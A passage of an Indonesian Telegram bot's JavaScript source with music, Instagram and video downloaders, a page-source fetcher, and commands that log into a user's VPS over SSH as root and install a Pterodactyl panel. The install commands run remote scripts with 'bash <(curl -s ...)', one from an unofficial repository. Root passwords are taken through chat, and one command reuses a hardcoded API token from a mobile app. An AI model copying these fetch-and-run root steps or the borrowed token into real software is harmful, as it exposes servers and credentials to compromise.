    "Biar aku jadi lagu, kamu jadi tenang.",
    "Ada hal yang tidak bisa dijelaskan, hanya dirasakan.",
    "Kalau hari ini berat, besok kita coba lagi.",
    "Kamu nggak terlambat, kamu sedang bertumbuh.",
    "Hidup memang ribut, tapi kamu masih bertahan.",
    "Malam selalu punya cara menenangkan.",
    "Yang patah bisa pulih, yang hilang bisa diganti.",
    "Kamu boleh rapuh, asal jangan menyerah.",
    "Lagu ini untuk kamu yang diam-diam berjuang.",
    "Semoga musik ini cukup untuk meredakan.",
    "Peluk dirimu sendiri, kamu sudah sejauh ini.",
    "Ada tenang di antara nada yang jatuh pelan.",
    "Kamu kuat, walau kamu tidak merasa begitu.",
    "Kalau sedih, biar sedih dulu… jangan ditahan.",
    "Yang penting kamu masih di sini.",
    "Malam ini, kita istirahat dari dunia.",
    "Tidak apa-apa kalau kamu belum baik-baik saja.",
    "Hati yang lelah juga butuh lagu.",
    "Kadang rindu cuma butuh diputar, bukan dikejar.",
    "Biar musik yang menyembuhkan, bukan waktu.",
    "Kamu berharga, bahkan saat kamu merasa tidak.",
    "Aku doakan kamu tenang, walau pelan.",
    "Jangan paksa bahagia, cukup bertahan dulu.",
    "Ada luka yang cuma paham ketika lagu diputar.",
    "Kalau kamu bingung, diam dulu… dengar ini.",
    "Hari buruk bukan berarti hidupmu buruk.",
    "Satu langkah kecil pun tetap langkah.",
    "Semua orang punya cara sendiri untuk bertahan.",
    "Biar lagu ini jadi tempat singgah sebentar.",
    "Yang kamu butuh bukan jawaban, tapi ketenangan.",
    "Kamu tidak sendirian, sungguh.",
    "Kalau kamu merasa hilang, mari pulang lewat musik.",
    "Malam bukan musuh, dia cuma sunyi.",
    "Biar pelan, yang penting jalan.",
    "Hidup itu berat, tapi kamu nggak sendiri.",
    "Ada bahagia kecil di ujung sabar.",
    "Mungkin kamu lelah, bukan gagal.",
    "Bukan kamu yang lemah, kamu cuma terlalu banyak menahan.",
    "Kamu layak dicintai tanpa syarat.",
    "Lagu ini bukan solusi, tapi bisa jadi teman.",
    "Aku harap kamu selalu menemukan alasan untuk bertahan.",
    "Boleh menangis, asal jangan berhenti hidup.",
    "Kamu tidak harus kuat setiap hari.",
    "Yang kamu cari mungkin bukan orang, tapi rasa tenang.",
    "Biar musik yang bicara, kamu cukup dengar.",
    "Kita semua pernah hancur, dan itu manusiawi.",
    "Malam ini, cukup kamu dan musik.",
    "Semoga besok lebih lembut padamu.",
    "Jika kamu lelah, berhenti sebentar tidak apa-apa.",
    "Ada rindu yang diam-diam jadi lagu.",
    "Kadang diam adalah cara paling kuat.",
    "Hati yang sunyi pun butuh peluk.",
    "Kalau kamu takut, pegang lagu ini erat-erat.",
    "Biar nada menuntunmu pulang.",
    "Kamu sudah melakukan yang terbaik.",
    "Tidak semua hal harus dimenangkan, beberapa cukup diterima.",
    "Semoga kamu selalu punya ruang untuk bernapas.",
    "Malam ini, kita tidak mengejar apa-apa.",
    "Kamu pantas mendapat hari yang lebih baik.",
    "Bukan salahmu kalau kamu lelah.",
    "Biar sedih lewat, jangan kamu simpan sendiri.",
    "Tenang ya… semuanya akan menemukan tempatnya.",
    "Biar lagu ini jadi pelan yang kamu butuhkan.",
    "Satu lagu bisa menyelamatkan satu malam.",
    "Kalau kamu patah, kamu juga bisa tumbuh lagi.",
    "Jangan lupa: kamu masih punya banyak kesempatan.",
    "Kamu bukan beban, kamu manusia.",
    "Kalau kamu kehilangan arah, dengarkan ini pelan-pelan.",
    "Biar musik jadi alasan kamu bertahan malam ini.",
    "Kamu lebih kuat dari yang kamu kira.",
    "Malam ini, cukup istirahat… besok lanjut lagi.",
  ];

  return quotes[Math.floor(Math.random() * quotes.length)];
}

// =====================
// Loading Animation (0% - 100%) - HITAM FULL
// =====================
async function searchingLoading(bot, chatId, messageId, query) {
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const texts = [
    "🌙 Menyiapkan pencarian...",
    "🔎 Menyusuri SoundCloud...",
    "🎧 Mengumpulkan nada terbaik...",
    "✨ Menemukan jejak lagu...",
    "📡 Menghubungkan ke sumber...",
    "🎶 Memastikan kualitas audio...",
    "🫧 Menyusun info musik...",
    "💫 Hampir selesai...",
    "🖤 Sedikit lagi ya...",
    "🌟 Finalisasi hasil...",
    "✅ Lagu berhasil ditemukan!",
  ];

  for (let i = 0; i < progressStages.length; i++) {
    const msg =
      "```" + "\n\n" +
      `🔍 Searching Music...\n` +
      `🎵 Query : ${query}\n\n` +
      `${progressStages[i]}\n\n` +
      `${texts[i]}\n\n` +
      "```";

    await bot.editMessageText(msg, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    }).catch(() => {});

    await sleep(300);
  }
}

// =====================
// /play (API DI DALAM, TANPA BUTTON)
// =====================
bot.onText(/^\/play(?:\s+([\s\S]+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match?.[1] || "").trim();

  if (!query) {
    return bot.sendMessage(chatId, "Format: /play <judul>\nContoh: /play tor monitor ketua");
  }

  // loading awal (hitam)
  const loading = await bot.sendMessage(chatId, "```🔍 Searching music...```", {
    parse_mode: "Markdown",
  });

  try {
    // animasi loading 0-100
    await searchingLoading(bot, chatId, loading.message_id, query);

    // ===== API LANGSUNG DI DALAM /play =====
    const apiUrl = "https://api-faa.my.id/faa/soundcloud-play";
    const res = await axios.get(apiUrl, {
      params: { query },
      timeout: 30000,
      validateStatus: () => true,
    });

    if (res.status !== 200) throw new Error(`API HTTP ${res.status}`);

    const data = res.data;
    if (!data?.status || !data?.result) {
      throw new Error(data?.message || "Gagal mengambil data dari API");
    }

    const r = data.result;
    if (!r.download_url) throw new Error("download_url tidak ada dari API");
    // =======================================

    // hapus loading
    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

    // info + quote (1 code block biar pasti kekutip semua)
    const title = r.title || "SoundCloud Track";
    const artist = r.user || "Unknown";
    const duration = msToTime(r.duration);
    const quote = pickQuote();

    const infoBlock =
      "```" + "\n" +
      `🌑 SOUNDCLOUD PLAY\n` +
      `🎧 Now Playing\n` +
      `🎼 Title  : ${title}\n` +
      `🫧 Artist : ${artist}\n` +
      `⏳ Time   : ${duration}\n` +
      `🎚️ Format : ${r.format || "mp3"}\n` +
      `\n` +
      `🖤 Night Quote\n` +
      `${quote}\n` +
      "```";

    await bot.sendMessage(chatId, infoBlock, { parse_mode: "Markdown" });

    // kirim mp3 langsung (tanpa tampilkan link)
    await bot.sendAudio(chatId, r.download_url, {
      title: title,
      performer: artist,
      caption: "🎶 Enjoy!",
    });
  } catch (e) {
    // kalau error, edit loading jadi error (kalau loading masih ada)
    await bot.editMessageText(`❌ ${e.message}`, {
      chat_id: chatId,
      message_id: loading.message_id,
    }).catch(() => bot.sendMessage(chatId, `❌ ${e.message}`));
  }
});
// Command /play
bot.onText(/^\/playyyerror(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  let query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Gunakan format:\n/play judul lagu\n/play judul lagu -v (untuk video)",
      { reply_to_message_id: msg.message_id }
    );
  }

  // Deteksi mode video
  const isVideo = query.endsWith("-v");
  if (isVideo) query = query.replace(/-v$/, "").trim();

  let progressMsg;
  try {
    // Progress awal
    progressMsg = await bot.sendMessage(chatId, "🔎 Mencari video...", {
      reply_to_message_id: msg.message_id,
    });

    // Pencarian YouTube
    const searchRes = await axios.get(
      `https://restapi-v2.simplebot.my.id/search/youtube?q=${encodeURIComponent(query)}`
    );
    const results = searchRes.data?.data;

    if (!results || !results.length) {
      await bot.editMessageText("❌ Tidak ada hasil ditemukan.", {
        chat_id: chatId,
        message_id: progressMsg.message_id,
      });
      return;
    }

    const video = results[0];

    // Update progress
    await bot.editMessageText(
      isVideo ? "⏳ Mengunduh video..." : "⏳ Mengunduh audio...",
      {
        chat_id: chatId,
        message_id: progressMsg.message_id,
      }
    );

    // API download
    const apiUrl = isVideo
      ? `https://restapi-v2.simplebot.my.id/download/ytmp4?url=${encodeURIComponent(video.url)}`
      : `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;

    const mediaRes = await axios.get(apiUrl);
    const mediaUrl = mediaRes.data?.result;

    if (!mediaUrl) {
      await bot.editMessageText("❌ Gagal mengambil media.", {
        chat_id: chatId,
        message_id: progressMsg.message_id,
      });
      return;
    }

    // Caption info (pakai HTML aman, tanpa <blockquote>)
    const caption = `
<b>🎵 ${video.title}</b>
👤 ${video.author?.name || "Unknown"}
⏱️ ${video.duration?.timestamp || "-"}
👁️ ${video.views} views
📅 ${video.ago}
`;

    // Sanitasi nama file
    const safeTitle = video.title.replace(/[<>:"/\\|?*]+/g, "");
    const ext = isVideo ? "mp4" : "mp3";
    const tmpFile = path.join(__dirname, `${Date.now()}-${safeTitle}.${ext}`);

    // Download file sementara
    const response = await axios({
      method: "get",
      url: mediaUrl,
      responseType: "stream",
    });

    await new Promise((resolve, reject) => {
      const stream = response.data.pipe(fs.createWriteStream(tmpFile));
      stream.on("finish", resolve);
      stream.on("error", reject);
    });

    // Kirim ke Telegram
    if (isVideo) {
      await bot.sendVideo(chatId, tmpFile, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
      });
    } else {
      await bot.sendAudio(chatId, tmpFile, {
        title: video.title,
        performer: video.author?.name || "Unknown",
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
      });
    }

    // Hapus file sementara + pesan progress
    fs.unlinkSync(tmpFile);
    bot.deleteMessage(chatId, progressMsg.message_id).catch(() => {});
  } catch (err) {
    console.error(err.response?.data || err.message);

    if (progressMsg) {
      await bot
        .editMessageText("❌ Terjadi kesalahan, coba lagi nanti.", {
          chat_id: chatId,
          message_id: progressMsg.message_id,
        })
        .catch(() => {});
      setTimeout(() => {
        bot.deleteMessage(chatId, progressMsg.message_id).catch(() => {});
      }, 5000);
    } else {
      bot.sendMessage(chatId, "❌ Terjadi kesalahan, coba lagi nanti.", {
        reply_to_message_id: msg.message_id,
      });
    }
  }
});
  
// === /getcode <url> ===
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/getcode')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
   const userId = msg.from.id;
   const isPremium = await premium (senderId);
   const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/crashandro')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});


bot.onText(/^\/(cvid|veo3)(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const command = match[1]; // cvid atau veo3
   const text = match[2] || '';
   const userId = msg.from.id;
   const randomImage = getRandomImage();
   const senderId = msg.from.id;
   const isPremium = await premium (senderId);
   const chatType = msg.chat.type;
          
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/cvid')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

    if (!text) {
        return bot.sendMessage(chatId, 'Masukkan prompt untuk membuat video!\nContoh: /' + command + ' A pixel-art queen in her throne room');
    }

    // Kirim pesan sedang memproses
    const processingMsg = await bot.sendMessage(chatId, '⏳ Sedang membuat video dari teks... Jangan berharap terlalu tinggi 😅');

    try {
        const prompt = text;
        const auth = 'eyJzdWIiwsdeOiIyMzQyZmczNHJ0MzR0weMzQiLCJuYW1lIjorwiSm9objMdf0NTM0NT';

        // Step 1: Request pembuatan video
        const { data: keyData } = await axios.post('https://soli.aritek.app/txt2videov3', {
            deviceID: Math.random().toString(16).substr(2, 8) + Math.random().toString(16).substr(2, 8),
            prompt: prompt,
            used: [],
            versionCode: 51
        }, {
            headers: {
                authorization: auth,
                'content-type': 'application/json; charset=utf-8',
                'accept-encoding': 'gzip',
                'user-agent': 'okhttp/4.11.0'
            }
        });

        // Step 2: Ambil video yang sudah dibuat
        const { data } = await axios.post('https://soli.aritek.app/video', {
            keys: [keyData.key]
        }, {
            headers: {
                authorization: auth,
                'content-type': 'application/json; charset=utf-8',
                'accept-encoding': 'gzip',
                'user-agent': 'okhttp/4.11.0'
            }
        });

        const videoUrl = data.datas[0]?.url;
        if (!videoUrl) {
            await bot.deleteMessage(chatId, processingMsg.message_id);
            return bot.sendMessage(chatId, '❌ Tidak ditemukan video.');
        }

        // Hapus pesan processing dan kirim video
        await bot.deleteMessage(chatId, processingMsg.message_id);
        
        await bot.sendVideo(chatId, videoUrl, {
            caption: `🎬 Hasil Text to Video:\n"${prompt}"`,
            reply_to_message_id: msg.message_id
        });

    } catch (error) {
        console.error('Error:', error);
        
        // Hapus pesan processing
        try {
            await bot.deleteMessage(chatId, processingMsg.message_id);
        } catch (deleteError) {
            console.error('Gagal menghapus pesan processing:', deleteError);
        }
        
        await bot.sendMessage(chatId, '❌ Gagal membuat video dari teks.', {
            reply_to_message_id: msg.message_id
        });
    }
});


async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", new Blob([fileBuffer]), filename);

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: form,
  });

  const text = await res.text();
  if (!res.ok || text.startsWith("ERROR")) {
    throw new Error("Upload gagal: " + text);
  }
  return text.trim();
}

// ─── INSTALL PANEL ───────────────────────────────────────────────
bot.onText(/^\/installpanel (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;

  // ⛔ Validasi premium
  if (!premium(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya user premium yang bisa menggunakan perintah ini!");
  }

  const text = match[1];
  if (!text) {
    return bot.sendMessage(chatId,
      "❌ Format salah!\nContoh: `/installpanel ipvps|pwvps|domainpanel|domainnode|ramserver`",
      { parse_mode: "Markdown" }
    );
  }

  const vii = text.split("|");
  if (vii.length < 5) {
    await bot.sendMessage(chatId, example());
    return;
  }

  // Simpan data
  userData[userId] = {
    ip: vii[0],
    password: vii[1],
    domainpanel: vii[2],
    domainnode: vii[3],
    ramserver: vii[4],
    step: "installing",
  };

  await bot.sendMessage(
    chatId,
    "⚙️ Memproses instalasi server panel...\nTunggu 1–10 menit hingga instalasi selesai..."
  );

  startInstallation(msg, bot);
});


// ─── PROSES INSTALASI ────────────────────────────────────────────
function startInstallation(msg, bot) {
  const userId = msg.from.id;

  if (!userData[userId]) {
    bot.sendMessage(msg.chat.id,
      "❌ Data pengguna tidak ditemukan, ulangi perintah!"
    );
    return;
  }

  const { ip, password, domainpanel, domainnode, ramserver } = userData[userId];

  const conn = new Client();
  const connSettings = { host: ip, port: 22, username: "root", password };

  const userPanel = `admin${Math.random().toString(36).substring(7)}`;
  const emailPanel = `admin@gmail.com`;
  const passwordPanel = `admin${Math.random().toString(36).substring(7)}`;

  const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;


  // ─────────────────────────────────────────
  // Install Wings
  const installWings = (conn) => {
    conn.exec(commandPanel, (err, stream) => {
      if (err) {
        bot.sendMessage(msg.chat.id, "❌ Gagal menjalankan instalasi wings:\n" + err.message);
        delete userData[userId];
        return;
      }

      stream
        .on("close", () => {
          // Setelah wings → install Node
          conn.exec(
            "bash <(curl -s https://raw.githubusercontent.com/antirusuhnihdeks/pterodactyl/main/createnode.sh)",
            (err, stream) => {
              if (err) {
                bot.sendMessage(msg.chat.id, "❌ Gagal membuat node:\n" + err.message);
                delete userData[userId];
                return;
              }

              stream
                .on("close", async () => {
                  const teks = `
𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗔𝗡𝗘𝗟 ✅

📌 *DATA LOGIN PANEL ANDA:*
👤 Username: *${userPanel}*
🔑 Password: *${passwordPanel}*
🌐 Domain Panel: *${domainpanel}*
`;
                  await bot.sendMessage(msg.chat.id, teks, { parse_mode: "Markdown" });
                  delete userData[userId];
                })
                .on("data", (data) => {
                  const out = data.toString();
                  console.log(out);

                  if (out.includes("Masukkan nama lokasi:")) stream.write("Singapore\n");
                  if (out.includes("Masukkan deskripsi lokasi:")) stream.write("Node By SYAH\n");
                  if (out.includes("Masukkan domain:")) stream.write(`${domainnode}\n`);
                  if (out.includes("Masukkan nama node:")) stream.write("Node By SYAH\n");
                  if (out.includes("Masukkan RAM (dalam MB):")) stream.write(`${ramserver}\n`);
                  if (out.includes("Masukkan jumlah maksimum disk space (dalam MB):")) stream.write(`${ramserver}\n`);
                  if (out.includes("Masukkan Locid:")) stream.write("1\n");
                })
                .stderr.on("data", (data) => console.log("NODE ERR:", data.toString()));
            }
          );
        })

        .on("data", (data) => {
          const out = data.toString();
          console.log("WINGS:", out);

          if (out.includes("Input 0-6")) stream.write("1\n");
          if (out.includes("(y/N)")) stream.write("y\n");
          if (out.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
          if (out.includes("Database host username")) stream.write(`${userPanel}\n`);
          if (out.includes("Database host password")) stream.write(`${passwordPanel}\n`);
          if (out.includes("Set the FQDN to use for Let's Encrypt")) stream.write(`${domainnode}\n`);
          if (out.includes("Enter email address for Let's Encrypt")) stream.write("admin@gmail.com\n");
        })

        .stderr.on("data", (data) => console.log("WINGS ERR:", data.toString()));
    });
  };


  // ─────────────────────────────────────────
  // Install Panel
  const installPanel = (conn) => {
    conn.exec(commandPanel, (err, stream) => {
      if (err) {
        bot.sendMessage(msg.chat.id, "❌ Gagal instal panel:\n" + err.message);
        delete userData[userId];
        return;
      }

      stream
        .on("close", () => installWings(conn))

        .on("data", (data) => {
          const out = data.toString();
          console.log("PANEL:", out);

          if (out.includes("Input 0-6")) stream.write("0\n");
          if (out.includes("(y/N)")) stream.write("y\n");
          if (out.includes("Database name")) stream.write(`${userPanel}\n`);
          if (out.includes("Database username")) stream.write(`${userPanel}\n`);
          if (out.includes("Password (press enter")) stream.write(`${passwordPanel}\n`);
          if (out.includes("Select timezone")) stream.write("Asia/Jakarta\n");
          if (out.includes("Provide the email address")) stream.write("admin@gmail.com\n");
          if (out.includes("Email address for the initial admin account")) stream.write("admin@gmail.com\n");
          if (out.includes("Username for the initial admin account")) stream.write(`${userPanel}\n`);
          if (out.includes("First name")) stream.write("admin\n");
          if (out.includes("Last name")) stream.write("admin\n");
          if (out.includes("Password for the initial admin account")) stream.write(`${passwordPanel}\n`);
          if (out.includes("Set the FQDN of this panel")) stream.write(`${domainpanel}\n`);
          if (out.includes("Do you want to automatically configure UFW")) stream.write("y\n");
          if (out.includes("Do you want to automatically configure HTTPS")) stream.write("y\n");
          if (out.includes("Select the appropriate number [1-2]")) stream.write("1\n");
          if (out.includes("I agree that this HTTPS request")) stream.write("y\n");
          if (out.includes("Proceed anyways")) stream.write("y\n");
          if (out.includes("(yes/no)")) stream.write("y\n");
          if (out.includes("Initial configuration completed")) stream.write("y\n");
          if (out.includes("Still assume SSL")) stream.write("y\n");
          if (out.includes("Please read the Terms of Service")) stream.write("y\n");
          if (out.includes("(A)gree/(C)ancel:")) stream.write("A\n");
        })

        .stderr.on("data", (data) => console.log("PANEL ERR:", data.toString()));
    });
  };

  // Start proses
  conn
    .on("ready", () => installPanel(conn))
    .on("error", (err) => {
      bot.sendMessage(msg.chat.id, `❌ Gagal koneksi ke server:\n${err.message}`);
      delete userData[userId];
    })
    .connect(connSettings);
}

bot.onText(/^\/uninstallwings(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const userId = msg.from.id;

  if (!text) {
    return bot.sendMessage(chatId, "❌ Format salah!\nContoh: /uninstallwings ip|password");
  }

  // === CEK PREMIUM SESUAI FILE UTAMA MU ===
  if (!premium(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya *USER PREMIUM* yang bisa menggunakan perintah ini!");
  }

  const [ip, password] = text.split("|");
  if (!ip || !password) {
    return bot.sendMessage(chatId, "❌ Format salah!\nGunakan:\n`/uninstallwings ip|password`", { parse_mode: "Markdown" });
  }

  const conn = new Client();
  bot.sendMessage(chatId, `🛠 ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴠᴘꜱ *${ip}*...\nꜱᴇᴅᴀɴɢ ᴘʀᴏꜱᴇꜱ ᴜɴɪɴꜱᴛᴀʟʟ ᴡɪɴɢꜱ + ʀᴇꜱᴇᴛ ᴘᴏʀᴛ`, { parse_mode: "Markdown" });

  conn.on("ready", () => {
    const script = `
systemctl stop wings
systemctl disable wings
rm -f /etc/systemd/system/wings.service
rm -f /usr/local/bin/wings
rm -rf /etc/pterodactyl
rm -rf /var/lib/pterodactyl
`;

    conn.exec(script, (err, stream) => {
      if (err) {
        conn.end();
        return bot.sendMessage(chatId, "❌ Gagal mengeksekusi perintah di VPS.");
      }

      stream.on("close", (code) => {
        conn.end();
        if (code === 0) {
          bot.sendMessage(chatId, `✅ *Wings berhasil dihapus dari VPS ${ip}*\n🧹 Port 8080 & 2022 juga dibersihkan.`, { parse_mode: "Markdown" });
        } else {
          bot.sendMessage(chatId, `⚠️ Selesai dengan kode ${code}. Sebagian mungkin gagal. Periksa manual.`);
        }
      }).on("data", (data) => {
        console.log("STDOUT:", data.toString());
      }).stderr.on("data", (data) => {
        console.error("STDERR:", data.toString());
      });
    });
  }).on("error", (err) => {
    bot.sendMessage(chatId, `❌ Tidak bisa konek ke VPS:\n${err.message}`);
  }).connect({
    host: ip,
    port: 22,
    username: "root",
    password: password,
    readyTimeout: 15000
  });
});

bot.onText(/^\/installwings (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const userId = msg.from.id;

  // 🔒 Cek Premium
  if (!setting.PREM_IDS.includes(userId)) {
    return bot.sendMessage(chatId, '❌ Hanya user premium yang bisa menggunakan perintah ini!');
  }

  if (!text.includes("|")) {
    return bot.sendMessage(chatId, "⚠️ Format: /installwings IpVps|PwVps|domainpanel|domainnode");
  }

  const parts = text.split("|").map(item => item.trim());
  if (parts.length !== 4) {
    return bot.sendMessage(chatId, "⚠️ Format: /installwings IpVps|PwVps|domainpanel|domainnode\nPastikan ada 4 bagian yang dipisah oleh |");
  }

  const [ipvps, passwd, domainpanel, domainnode] = parts;
  if (!ipvps || !passwd || !domainpanel || !domainnode) {
    return bot.sendMessage(chatId, "⚠️ Format: /installwings IpVps|PwVps|domainpanel|domainnode\nSemua bagian harus diisi!");
  }

  const loadingMsg = await bot.sendMessage(chatId, "🔍 ᴍᴇɴɢᴜʟᴀꜱ ᴋᴏɴᴇᴋꜱɪ ᴠᴘꜱ...");
  lastMessageContent[chatId] = "🔍 ᴍᴇɴɢᴜʟᴀꜱ ᴋᴏɴᴇᴋꜱɪ ᴠᴘꜱ...";

  const connSettings = {
    host: ipvps,
    port: 22,
    username: "root",
    password: passwd,
    readyTimeout: 15000
  };

  const command = `bash <(curl -s https://pterodactyl-installer.se)`;
  const emailrandom = `syahv2d@gmail.com`;
  const userDb = `syahv2d${Math.random().toString(36).substring(7)}`;
  const passwordDb = `syahv2d${Math.random().toString(36).substring(7)}`;
  const conn = new Client();

  const updateProgress = async (newText) => {
    if (lastMessageContent[chatId] !== newText) {
      try {
        await bot.editMessageText(newText, {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        });
        lastMessageContent[chatId] = newText;
      } catch (error) {
        if (!error.message.includes('message is not modified')) {
          console.error('Edit message error:', error.message);
        }
      }
    }
  };

  conn
    .on("ready", async () => {
      const newText = `✅ ᴋᴏɴᴇᴋꜱɪ ʙᴇʀʜᴀꜱɪʟ\n⏳ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ɪɴꜱᴛᴀʟʟ wings...\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailrandom}\n🗃️ DB: ${userDb} | ${passwordDb}\n⏰ ᴛᴜɴɢɢᴜ 1-10 ᴍᴇɴɪᴛ...`;
      await updateProgress(newText);

      conn.exec(command, (err, stream) => {
        if (err) {
          updateProgress("❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴇᴋꜱᴇᴋᴜꜱɪ ᴄᴏᴍᴍᴀɴᴅ!");
          return conn.end();
        }

        let progressUpdated = false;

        stream
          .on("close", async () => {
            try {
              await bot.deleteMessage(chatId, loadingMsg.message_id);
              delete lastMessageContent[chatId];
              await bot.sendMessage(chatId, `✅ ʙᴇʀʜᴀꜱɪʟ ɪɴꜱᴛᴀʟʟ ᴡɪɴɢꜱ!\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailrandom}\n🗃️ DB: ${userDb} | ${passwordDb}\n`);
            } catch (error) {
              console.error('Delete message error:', error.message);
            }
            conn.end();
          })
          .on("data", (data) => {
            const output = data.toString();
            console.log("OUTPUT:", output);
            
            if (!progressUpdated && output.includes("Installing")) {
              updateProgress("📦 ᴍᴇɴɢɪɴꜱᴛᴀʟ ᴘᴀᴋᴇᴛ...\n⏰ ᴛᴜɴɢɢᴜ...");
              progressUpdated = true;
            }

            if (output.includes("Input 0-6")) stream.write("1\n");
            if (output.includes("(y/N)")) stream.write("y\n");
            if (output.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
            if (output.includes("Database host username")) stream.write(`${userDb}\n`);
            if (output.includes("Database host password")) stream.write(`${passwordDb}\n`);
            if (output.includes("Set the FQDN to use for Let's Encrypt")) stream.write(`${domainnode}\n`);
            if (output.includes("Enter email address")) stream.write(`${emailrandom}\n`);
          })
          .stderr.on("data", (data) => {
            console.log("ERROR:", data.toString());
          });
      });
    })
    .on("error", async (err) => {
      console.error("SSH Error:", err.message);
      await updateProgress("❌ ɢᴀɢᴀʟ ᴋᴏɴᴇᴋꜱɪ\nᴘᴀꜱᴛɪᴋᴀɴ ɪᴘ/ᴘᴀꜱꜱ ʙᴇɴᴀʀ!");
    })
